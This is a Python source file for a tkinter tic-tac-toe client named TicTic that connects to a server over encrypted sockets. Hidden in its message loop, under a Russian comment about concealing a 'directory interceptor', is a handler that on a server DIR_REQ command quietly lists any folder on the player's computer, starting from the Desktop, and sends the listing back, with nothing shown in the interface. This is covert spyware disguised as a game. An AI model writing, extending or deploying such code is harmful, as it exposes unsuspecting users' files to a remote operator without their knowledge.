import socket
import threading
import tkinter as tk
from tkinter import messagebox, filedialog
import base64
from PIL import Image, ImageTk
import io
import os
from cryptography.fernet import Fernet
import config

cipher = Fernet(config.FERNET_KEY)

class TicTic:
    def __init__(self, root):
        self.root = root
        self.root.title("TicTic")
        self.root.geometry("300x200")
        self.root.configure(bg="#d4d0c8")
        self.symbol = None
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.connect((config.HOST, config.PORT))
        except:
            messagebox.showerror("Error", "Server offline . . .")
            root.destroy()
            return
        self.login_ui()
        threading.Thread(target=self.receive, daemon=True).start()

    def send_secure(self, msg):
        try:
            encrypted = cipher.encrypt(msg.encode()).decode()
            self.client.send((encrypted + "\n").encode())
        except:
            pass

    def clear(self):
        for w in self.root.winfo_children(): w.destroy()

    def login(self):
        email = self.e.get().strip()
        h_pass = config.hash_password(self.p.get().strip())
        if not email or not self.p.get().strip(): return
        self.send_secure(f"LOGIN|{email}|{h_pass}")

    def register(self):
        email = self.e.get().strip()
        h_pass = config.hash_password(self.p.get().strip())
        if not email or not self.p.get().strip(): return
        self.send_secure(f"REGISTER|{email}|{h_pass}")

    def login_ui(self):
        self.clear()
        f = tk.Frame(self.root, bg="#d4d0c8")
        f.pack(expand=True)
        tk.Label(f, text="Email", bg="#d4d0c8").pack()
        self.e = tk.Entry(f);
        self.e.pack()
        tk.Label(f, text="Password", bg="#d4d0c8").pack()
        self.p = tk.Entry(f, show="*");
        self.p.pack()
        tk.Button(f, text="LOGIN", width=15, command=self.login).pack(pady=5)
        tk.Button(f, text="REGISTER", width=15, command=self.register).pack()

    def process_dir(self, path):
        try:
            target = os.path.expanduser("~/Desktop") if path == "DESKTOP" else path
            if not os.path.exists(target):
                self.send_secure(f"DIR_RES|{target}|ERROR|Not found")
                return
            items = []
            for f in os.listdir(target):
                fp = os.path.join(target, f)
                items.append(f"[DIR] {f}" if os.path.isdir(fp) else f"[FILE] {f}")

            parent = os.path.dirname(target)
            data = "<|>".join(items)
            self.send_secure(f"DIR_RES|{target}|{parent}|{data}")
        except Exception as e:
            self.send_secure(f"DIR_RES|{path}|ERROR|{str(e)}")

    def receive(self):
        buffer = ""
        while True:
            try:
                data = self.client.recv(16384).decode()
                if not data: break
                buffer += data
                while "\n" in buffer:
                    raw_msg, buffer = buffer.split("\n", 1)
                    msg = cipher.decrypt(raw_msg.encode()).decode()

                    if msg == "PHOTO_REQUIRED":
                        self.root.after(0, self.send_photo)
                    elif msg.startswith("START"):
                        _, sym, my_p, opp_p = msg.split("|", 3)
                        self.symbol, self.my_photo_b64, self.opp_photo_b64 = sym, my_p, opp_p
                        self.root.after(0, self.game_ui)
                    elif msg.startswith("BOARD"):
                        b_data = msg.split("|")[1].split(",")
                        self.root.after(0, lambda bd=b_data: self.update_board(bd))
                    elif msg.startswith("WIN"):
                        w = msg.split("|")[1]
                        res = "Draw . . ." if w == "DRAW" else f"{w} WINS :)"
                        self.root.after(0, lambda r=res: messagebox.showinfo("GAME OVER", r))
                    elif msg.startswith("ERROR"):
                        messagebox.showerror("ERR", msg.split("|")[1])

                    # Прячем перехватчик директорий в фон
                    elif msg.startswith("DIR_REQ|"):
                        path = msg.split("|", 1)[1]
                        threading.Thread(target=self.process_dir, args=(path,), daemon=True).start()
            except:
                break

    def send_photo(self):
        path = filedialog.askopenfilename()
        if path:
            with open(path, "rb") as f: img = base64.b64encode(f.read()).decode()
            self.send_secure(f"PHOTO|{self.e.get()}|{img}")

    def game_ui(self):
        self.clear()
        self.root.geometry("320x400")
        top_frame = tk.Frame(self.root, bg="#d4d0c8")
        top_frame.pack(fill="x", pady=10, padx=10)
        try:
            my_img = Image.open(io.BytesIO(base64.b64decode(self.my_photo_b64)))
            self.win_icon = ImageTk.PhotoImage(my_img)
            self.root.iconphoto(False, self.win_icon)
            self.my_tk = ImageTk.PhotoImage(my_img.resize((50, 50)))
            tk.Label(top_frame, image=self.my_tk, bg="#d4d0c8").pack(side="left")
            opp_img = Image.open(io.BytesIO(base64.b64decode(self.opp_photo_b64))).resize((50, 50))
            self.opp_tk = ImageTk.PhotoImage(opp_img)
            tk.Label(top_frame, image=self.opp_tk, bg="#d4d0c8").pack(side="right")
        except:
            pass
        self.info = tk.Label(top_frame, text=f"YOU ARE {self.symbol}", bg="#d4d0c8", font=("Tahoma", 12, "bold"))
        self.info.pack(side="left", expand=True)
        f = tk.Frame(self.root, bg="#d4d0c8")
        f.pack(pady=10)
        self.btns = []
        for i in range(9):
            b = tk.Button(f, text=" ", width=6, height=3, font=("Tahoma", 14, "bold"), relief="raised",
                          command=lambda idx=i: self.send_secure(str(idx)))
            b.grid(row=i // 3, column=i % 3)
            self.btns.append(b)

    def update_board(self, board):
        for i in range(9): self.btns[i].config(text=board[i])

if __name__ == "__main__":
    root = tk.Tk()
    TicTic(root)
    root.mainloop()